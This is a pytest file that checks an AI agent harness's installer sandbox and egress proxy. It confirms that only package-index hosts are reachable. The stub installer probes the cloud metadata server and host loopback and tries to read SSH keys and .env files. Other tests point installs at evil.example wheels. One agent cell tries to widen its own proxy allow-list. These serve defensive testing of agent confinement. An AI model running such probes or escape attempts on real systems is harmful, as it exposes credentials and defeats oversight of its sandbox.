"""The package installer reaches the package index and nothing else.

The installer runs ``uv`` inside bubblewrap with no network of its own
(test_install_confinement.py covers the rest of its confinement). Its one
route out is a loopback port forwarded to the harness's allow-listing
CONNECT proxy (``sandbox.EgressProxy``), which opens tunnels only to the
package index hosts (``environment.index_hosts``: PyPI, or a mirror the
operator configured with ``UV_INDEX*``), and never to a loopback,
link-local or private address, whatever a name resolves to. So the host's
loopback services and the cloud metadata server (``169.254.169.254``, which
hands out a GCP worker's service-account token) are out of reach, and
nothing a cell does adds a host.

No model is called and nothing leaves the machine: the proxy is driven
directly over its socket; a stub ``uv`` probes the network from inside the
installer's sandbox; the real ``uv`` is pointed at hosts the proxy refuses
before resolving them; a cell in the sandboxed worker tries to widen the
allow-list with the installer stubbed.
"""

from __future__ import annotations

import inspect
import json
import os
import socket
import subprocess
import sys
import textwrap
import threading
import types
from pathlib import Path

import pytest

from tests.helpers import _handle_project
from tests.actor.code_act.core_world import (  # noqa: F401 (fixtures)
    core_world,
    new_actor,
)
from tests.actor.code_act.sandbox_world import (  # noqa: F401 (fixture)
    ENV_SECRET,
    SSH_SECRET,
    STATE_SECRET,
    TOKEN_VALUE,
    needs_bwrap,
    world,
)
from unify import environment, sandbox

_REAL_RESOLVE = sandbox._resolve
_REAL_PUBLIC = sandbox.public_address


class _Listener:
    """A host TCP service on loopback that counts connections and answers them."""

    def __init__(self, reply: bytes = b"from host\n") -> None:
        self.accepted = 0
        self._srv = socket.socket()
        self._srv.bind(("127.0.0.1", 0))
        self._srv.listen(8)
        self.port = self._srv.getsockname()[1]
        self._reply = reply
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self) -> None:
        while True:
            try:
                conn, _ = self._srv.accept()
            except OSError:
                return
            self.accepted += 1
            try:
                conn.sendall(self._reply)
            finally:
                conn.close()

    def close(self) -> None:
        try:
            self._srv.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self._srv.close()


@pytest.fixture
def listener():
    srv = _Listener()
    yield srv
    srv.close()


def _ask(proxy: sandbox.EgressProxy, request: bytes) -> tuple[str, bytes]:
    """Send *request* to *proxy*'s socket: its status line, and what followed."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(15)
    try:
        s.connect(str(proxy.path))
        s.sendall(request)
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        if head.startswith(b"HTTP/1.1 200"):
            try:
                rest += s.recv(4096)
            except OSError:
                pass
        return head.split(b"\r\n", 1)[0].decode(), rest
    finally:
        s.close()


def _connect(target: str) -> bytes:
    return f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()


# ── the proxy itself ────────────────────────────────────────────────────────


@pytest.mark.timeout(60)
def test_the_proxy_refuses_every_host_off_the_allow_list(listener, monkeypatch):
    resolved: list[str] = []

    def watched(host, port):
        resolved.append(host)
        return _REAL_RESOLVE(host, port)

    monkeypatch.setattr(sandbox, "_resolve", watched)
    with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as proxy:
        for target in (
            "evil.example:443",
            "169.254.169.254:80",
            "169.254.169.254:443",
            "metadata.google.internal:80",
            f"127.0.0.1:{listener.port}",
            f"localhost:{listener.port}",
            "[::1]:443",
            # An allowed host on another port.
            "pypi.org:80",
        ):
            status, _ = _ask(proxy, _connect(target))
            assert status.startswith("HTTP/1.1 403"), (target, status)
        # Anything but a tunnel: a plain-HTTP request through the proxy.
        status, body = _ask(
            proxy,
            b"GET http://169.254.169.254/computeMetadata/v1/ HTTP/1.1\r\n"
            b"Host: 169.254.169.254\r\nMetadata-Flavor: Google\r\n\r\n",
        )
        assert status.startswith("HTTP/1.1 405"), status
        assert b"only CONNECT" in body
        status, _ = _ask(proxy, _connect("pypi.org"))
        assert status.startswith("HTTP/1.1 400"), status
        refused = [target for target, _ in proxy.refused]
    assert "evil.example:443" in refused and "169.254.169.254:80" in refused
    # Refused by name, before any lookup or connection.
    assert resolved == []
    assert listener.accepted == 0


@pytest.mark.timeout(60)
def test_the_proxy_never_reaches_a_non_public_address_whatever_a_name_resolves_to(
    listener,
    monkeypatch,
):
    # An allowed name that resolves to the metadata server, to loopback (the
    # host's own services) or to a private address is still refused.
    answers = {
        "pypi.org": "169.254.169.254",
        "files.pythonhosted.org": "10.0.0.7",
        "mirror.example": "127.0.0.1",
    }

    def resolve(host, port):
        if host == "localhost":
            return _REAL_RESOLVE(host, port)
        family = socket.AF_INET6 if ":" in answers[host] else socket.AF_INET
        return [(family, socket.SOCK_STREAM, 6, "", (answers[host], port))]

    monkeypatch.setattr(sandbox, "_resolve", resolve)
    allowed = [
        ("pypi.org", 443),
        ("files.pythonhosted.org", 443),
        ("mirror.example", listener.port),
        ("localhost", listener.port),
    ]
    with sandbox.egress_proxy(allowed) as proxy:
        for target in (
            "pypi.org:443",
            "files.pythonhosted.org:443",
            f"mirror.example:{listener.port}",
            f"localhost:{listener.port}",
            f"LOCALHOST.:{listener.port}",
        ):
            status, body = _ask(proxy, _connect(target))
            assert status.startswith("HTTP/1.1 403"), (target, status)
            assert b"non-public" in body, body
    assert listener.accepted == 0


@pytest.mark.parametrize(
    ("address", "public"),
    [
        ("151.101.0.223", True),  # pypi.org (Fastly)
        ("2a04:4e42::223", True),
        ("169.254.169.254", False),  # the metadata server
        ("fd00:ec2::254", False),  # AWS's IPv6 metadata server
        ("127.0.0.1", False),
        ("127.8.9.10", False),
        ("::1", False),
        ("0.0.0.0", False),
        ("::", False),
        ("10.1.2.3", False),
        ("172.16.0.1", False),
        ("192.168.1.1", False),
        ("100.64.0.1", False),  # shared (CGNAT)
        ("fe80::1", False),
        ("fe80::1%eth0", False),
        ("fc00::1", False),
        ("224.0.0.1", False),
        ("::ffff:169.254.169.254", False),  # IPv4-mapped
        ("::ffff:127.0.0.1", False),
        ("2002:a9fe:a9fe::1", False),  # 6to4 around the metadata server
        ("64:ff9b::a9fe:a9fe", False),  # NAT64 to the metadata server
        ("64:ff9b::7f00:1", False),  # NAT64 to loopback
        ("not-an-address", False),
    ],
)
def test_public_addresses(address, public):
    assert sandbox.public_address(address) is public


@pytest.mark.timeout(60)
def test_the_proxy_tunnels_to_an_allowed_host(listener, monkeypatch):
    """The positive path: an allowed host gets a tunnel. The host here is a
    loopback listener, so the address filter is told it is public."""
    monkeypatch.setattr(
        sandbox,
        "_resolve",
        lambda host, port: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port)),
        ],
    )
    monkeypatch.setattr(
        sandbox,
        "public_address",
        lambda a: a == "127.0.0.1" or _REAL_PUBLIC(a),
    )
    with sandbox.egress_proxy([("index.test", listener.port)]) as proxy:
        status, data = _ask(proxy, _connect(f"index.test:{listener.port}"))
        assert status == "HTTP/1.1 200 Connection established", status
        assert data == b"from host\n"
        status, _ = _ask(proxy, _connect(f"other.test:{listener.port}"))
        assert status.startswith("HTTP/1.1 403")
    assert listener.accepted == 1
    # Closed: the socket's directory is gone.
    assert not proxy.directory.exists()


# ── the allow-list: the harness's, never a cell's ──────────────────────────


def test_the_allow_list_is_the_index_and_the_operators_mirrors():
    assert environment.index_hosts({}) == (
        ("pypi.org", 443),
        ("files.pythonhosted.org", 443),
    )
    hosts = environment.index_hosts(
        {
            "UV_INDEX_URL": "https://Mirror.Example:8443/simple",
            "UV_EXTRA_INDEX_URL": "https://a.example/simple https://b.example/s",
            "UV_INDEX": "internal=https://c.example/simple http://plain.example/",
            "UV_DEFAULT_INDEX": "https://user:pw@d.example/simple",  # pragma: allowlist secret
            # Not an index variable.
            "PIP_INDEX_URL": "https://e.example/simple",
        },
    )
    assert hosts == (
        ("pypi.org", 443),
        ("files.pythonhosted.org", 443),
        ("mirror.example", 8443),
        ("d.example", 443),
        ("a.example", 443),
        ("b.example", 443),
        ("c.example", 443),
    )
    # install() names packages only: nothing a caller passes reaches the
    # proxy's allow-list.
    assert list(inspect.signature(environment.install).parameters) == [
        "specifiers",
        "timeout",
    ]


# ── inside the installer's sandbox ──────────────────────────────────────────

_STUB_UV = """#!{python} -I
# A stand-in for uv: probes what the installer's sandbox can reach.
import json, os, socket, sys

HOST_PORT = {port}
TARGETS = {targets!r}
OUTSIDE = {outside!r}
SECRETS = {secrets!r}
args = sys.argv[1:]
if args[:1] == ["venv"]:
    os.makedirs(os.path.join(args[-1], "bin"), exist_ok=True)
    open(os.path.join(args[-1], "bin", "python"), "w").close()
    sys.exit(0)
venv = os.path.dirname(os.path.dirname(args[args.index("--python") + 1]))


def direct(host, port):
    try:
        s = socket.create_connection((host, port), timeout=3)
    except OSError as exc:
        return "failed: " + type(exc).__name__
    try:
        return "connected: " + s.recv(64).decode(errors="replace")
    finally:
        s.close()


def via_proxy(target):
    host, port = os.environ["HTTPS_PROXY"].rsplit("/", 1)[1].rsplit(":", 1)
    try:
        s = socket.create_connection((host, int(port)), timeout=5)
        s.settimeout(10)
        s.sendall(f"CONNECT {{target}} HTTP/1.1\\r\\nHost: {{target}}\\r\\n\\r\\n".encode())
        data = b""
        while b"\\r\\n\\r\\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\\r\\n\\r\\n")
        if head.startswith(b"HTTP/1.1 200"):
            rest += s.recv(64)
        s.close()
        return head.split(b"\\r\\n", 1)[0].decode() + " | " + rest.decode().strip()
    except OSError as exc:
        return "failed: " + type(exc).__name__


seen = {{"argv": args, "env": dict(os.environ)}}
seen["direct"] = {{
    "host loopback": direct("127.0.0.1", HOST_PORT),
    "metadata server": direct("169.254.169.254", 80),
}}
seen["proxy"] = {{t: via_proxy(t) for t in TARGETS}}
try:
    with open(OUTSIDE, "w") as f:
        f.write("written by the installer")
    seen["wrote_outside"] = True
except OSError:
    seen["wrote_outside"] = False
readable = []
for path in SECRETS:
    try:
        with open(path) as f:
            readable.append(path + ": " + f.read(80))
    except OSError:
        pass
seen["read_secrets"] = readable
with open(os.path.join(venv, "uv-report.json"), "w") as f:
    json.dump(seen, f)
"""


def _stub_uv(world, monkeypatch, listener, targets) -> Path:
    """Put the probing ``uv`` first on PATH; returns where it writes its report."""
    bin_dir = world["home"].parent / "bin"
    bin_dir.mkdir()
    uv = bin_dir / "uv"
    uv.write_text(
        _STUB_UV.format(
            python=sys.executable,
            port=listener.port,
            targets=targets,
            outside=str(world["home"] / "written-by-the-installer"),
            secrets=[
                str(world["home"] / ".ssh" / "id_rsa"),
                str(world["home"] / ".env"),
                str(world["state"] / "logs" / "unify.log"),
            ],
        ),
    )
    uv.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    return environment.environment_dir() / "uv-report.json"


@needs_bwrap
@pytest.mark.timeout(120)
def test_the_installer_has_no_network_but_the_proxy_to_the_index(
    world,
    listener,
    monkeypatch,
):
    assert listener.port != sandbox.INSTALLER_PROXY_PORT
    for name, value in (
        ("OPENROUTER_API_KEY", "sk-or-fake-0c7d"),  # pragma: allowlist secret
        # The harness's own proxy settings never route the installer.
        ("HTTPS_PROXY", f"http://127.0.0.1:{listener.port}"),
        ("NO_PROXY", "*"),
    ):
        monkeypatch.setenv(name, value)
    targets = [
        f"127.0.0.1:{listener.port}",
        f"localhost:{listener.port}",
        "169.254.169.254:80",
        "metadata.google.internal:80",
        "evil.example:443",
    ]
    report = _stub_uv(world, monkeypatch, listener, targets)

    outcome = environment.install(["humanize"])
    assert outcome["success"], outcome
    seen = json.loads(report.read_text())
    assert seen["argv"][2:5] == ["--no-config", "--only-binary", ":all:"]
    # No network of its own: the host's loopback service and the metadata
    # server are unreachable directly ...
    for what, result in seen["direct"].items():
        assert result.startswith("failed"), (what, result)
    # ... and through the proxy, which is the only route out.
    assert seen["env"]["HTTPS_PROXY"] == (
        f"http://127.0.0.1:{sandbox.INSTALLER_PROXY_PORT}"
    )
    assert "NO_PROXY" not in seen["env"]
    for target, result in seen["proxy"].items():
        assert result.startswith("HTTP/1.1 403"), (target, result)
    assert listener.accepted == 0
    # A refusal reaches the caller with the rule behind it.
    assert "installer-index-only" in outcome["stderr"]
    assert "evil.example:443 is not a package index host" in outcome["stderr"]
    # What runs at install time is confined as a shell cell is.
    assert not any(sandbox.is_secret_name(k) for k in seen["env"]), seen["env"]
    assert TOKEN_VALUE not in seen["env"].values()
    assert seen["wrote_outside"] is False
    read = "\n".join(seen["read_secrets"])
    assert not any(s in read for s in (SSH_SECRET, ENV_SECRET, STATE_SECRET)), read


@needs_bwrap
@pytest.mark.timeout(120)
def test_an_operator_mirror_is_reached_through_the_proxy(
    world,
    listener,
    monkeypatch,
):
    """The positive path from inside the sandbox: the mirror the harness's
    ``UV_INDEX_URL`` names gets a tunnel (a loopback listener here, so the
    address filter is told it is public for this one name)."""
    monkeypatch.setenv("UV_INDEX_URL", f"https://index.test:{listener.port}/simple")

    def resolve(host, port):
        if host == "index.test":
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port))]
        return _REAL_RESOLVE(host, port)

    monkeypatch.setattr(sandbox, "_resolve", resolve)
    monkeypatch.setattr(
        sandbox,
        "public_address",
        lambda a: a == "127.0.0.1" or _REAL_PUBLIC(a),
    )
    report = _stub_uv(
        world,
        monkeypatch,
        listener,
        [f"index.test:{listener.port}", f"127.0.0.1:{listener.port}"],
    )

    outcome = environment.install(["humanize"])
    assert outcome["success"], outcome
    seen = json.loads(report.read_text())
    assert seen["proxy"][f"index.test:{listener.port}"] == (
        "HTTP/1.1 200 Connection established | from host"
    )
    # Not by address, though: only the allowed name.
    assert seen["proxy"][f"127.0.0.1:{listener.port}"].startswith("HTTP/1.1 403")
    assert seen["direct"]["host loopback"].startswith("failed")
    assert listener.accepted == 1


@needs_bwrap
@pytest.mark.timeout(180)
def test_real_uv_cannot_fetch_from_a_host_off_the_allow_list(world, monkeypatch):
    """The real installer, pointed by a specifier at a host the model chose
    and at the metadata server: the proxy refuses both before any lookup."""
    import shutil

    if shutil.which("uv") is None:
        pytest.skip("uv is not installed")
    monkeypatch.setenv("UV_HTTP_RETRIES", "0")
    resolved: list[str] = []

    def watched(host, port):
        resolved.append(host)
        raise OSError("no lookups in this test")

    monkeypatch.setattr(sandbox, "_resolve", watched)
    outcome = environment.install(
        ["probe @ https://evil.example/probe-0.1-py3-none-any.whl"],
    )
    assert not outcome["success"], outcome
    assert "installer-index-only" in outcome["stderr"], outcome["stderr"]
    assert "evil.example:443 is not a package index host" in outcome["stderr"]
    outcome = environment.install(
        ["probe @ http://169.254.169.254/latest/probe-0.1-py3-none-any.whl"],
    )
    assert not outcome["success"], outcome
    assert "only CONNECT tunnels" in outcome["stderr"], outcome["stderr"]
    assert resolved == []
    assert environment.missing(["probe"]) == ["probe"]


# ── from a cell ─────────────────────────────────────────────────────────────

_WIDEN = textwrap.dedent(
    """\
    import os
    os.environ["UV_INDEX_URL"] = "https://evil.example/simple"
    os.environ["UV_EXTRA_INDEX_URL"] = "https://evil2.example/simple"
    os.environ["HTTPS_PROXY"] = "http://evil.example:8080"
    os.environ["NO_PROXY"] = "*"
    first = await install(["humanize"])
    try:
        await install(["humanize"], index_url="https://evil.example/simple")
        widened = "accepted"
    except Exception as exc:
        widened = type(exc).__name__
    try:
        await install(["--index-url=https://evil.example/simple", "humanize"])
        option = "accepted"
    except Exception as exc:
        option = type(exc).__name__
    (first["success"], widened, option)
    """,
)


@needs_bwrap
@pytest.mark.asyncio
@pytest.mark.timeout(240)
@_handle_project
async def test_a_cell_cannot_widen_the_allow_list(core_world, monkeypatch):
    from unify.actor import core_surface
    from unify.actor.execution import _CURRENT_SANDBOX, PythonExecutionSession
    from unify.actor.execution import worker

    assert worker.enabled(), "cells must run in the sandboxed worker"

    allowed: list[frozenset] = []
    launched: list[tuple[list[str], dict]] = []
    original = sandbox.EgressProxy.__init__

    def watched(self, hosts):
        original(self, hosts)
        allowed.append(self.allowed)

    def fake_run(argv, **kwargs):
        launched.append((list(argv), dict(kwargs.get("env") or {})))
        if "venv" in argv and "pip" not in argv:
            python = environment.environment_python()
            python.parent.mkdir(parents=True, exist_ok=True)
            python.touch()
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(sandbox.EgressProxy, "__init__", watched)
    monkeypatch.setattr(environment, "subprocess", types.SimpleNamespace(run=fake_run))

    actor = new_actor()
    session = PythonExecutionSession(environments={})
    objects = core_surface.sandbox_objects(actor, policy=core_surface.WritePolicy())
    session.global_state.update(objects)
    session.core_globals = objects
    token = _CURRENT_SANDBOX.set(session)
    try:
        out = await actor.get_tools("act")["execute_code"].fn(
            thought="Try to widen the installer's reach.",
            code=_WIDEN,
        )
    finally:
        _CURRENT_SANDBOX.reset(token)
        await session.close()
        await actor.close()
    assert out.error is None, out.error
    success, widened, option = out.result
    assert success is True
    assert widened != "accepted" and option != "accepted", (widened, option)
    # One install ran, with the harness's allow-list and the harness's proxy.
    assert allowed == [frozenset(environment.DEFAULT_INDEX_HOSTS)]
    pips = [(argv, env) for argv, env in launched if "pip" in argv]
    assert len(pips) == 1, launched
    argv, env = pips[0]
    assert not any("evil" in a for a in argv), argv
    assert not any("evil" in v for v in env.values()), env
    assert env["HTTPS_PROXY"] == f"http://127.0.0.1:{sandbox.INSTALLER_PROXY_PORT}"
    assert "NO_PROXY" not in env
    # The cell's variables stayed in the worker.
    assert "UV_INDEX_URL" not in os.environ
